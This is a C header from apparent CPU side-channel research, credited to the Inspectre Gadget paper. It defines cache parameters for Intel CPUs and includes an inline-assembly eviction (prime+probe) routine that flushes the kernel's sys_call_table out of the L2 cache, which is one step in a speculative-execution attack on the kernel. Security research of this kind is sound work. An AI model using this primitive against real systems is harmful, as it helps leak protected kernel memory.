/*
 *  All code credits go to the Inspectre Gadget paper [1]. 
 *  - Alan :) 
 * 
 *  [1] Inspectre Gadget by Weibing et al. https://github.com/vusec/inspectre-gadget  
 */

#ifndef _EVICT_SYS_TABLE_L2_H_
#define _EVICT_SYS_TABLE_L2_H_

#if defined(INTEL_10_GEN)
    #define L1_WAYS (8)
    #define L2_WAYS (12)
    #define L2_SETS (1024)

#elif defined(INTEL_13_GEN)
    #define L1_WAYS (12)
    // #define L2_WAYS (16 + 8)
    #define L2_WAYS (16)
    #define L2_SETS (2048)
    #define L3_WAYS (12)
    #define L3_SETS (49152)
#else
    #error "Not supported micro-architecture"
    // silence undefined errors
    #define L1_WAYS 1
    #define L2_WAYS 1
    #define L2_SETS 1
#endif


extern void * ev_set_l2[];


void find_ev_set_for_sys_call_table(uint64_t sys_call_table_off);

__always_inline void evict(void **ev_set)
{
	void **start = (void **)ev_set[0];
	void **p = start;
	for(int i = 0; i < 5; i++) {
        asm volatile( // SUPER OPTIMIZED PRIME+PROBE FOR RAPTOR LAKE --> exactly L2_WAYS (16) 
            "mov (%0), %0\n"
            "mov (%0), %0\n"
            "mov (%0), %0\n"
            "mov (%0), %0\n"

            "mov (%0), %0\n"
            "mov (%0), %0\n"
            "mov (%0), %0\n"
            "mov (%0), %0\n"

            "mov (%0), %0\n"
            "mov (%0), %0\n"
            "mov (%0), %0\n"
            "mov (%0), %0\n"

            "mov (%0), %0\n"
            "mov (%0), %0\n"
            "mov (%0), %0\n"
            "mov (%0), %0\n"
            : "=r" (p)
            : "0" (p)
            : );
    }
}

__always_inline void evict_sys_call_table() {
    evict(ev_set_l2);
}


#endif //_EVICT_SYS_TABLE_L2_H_
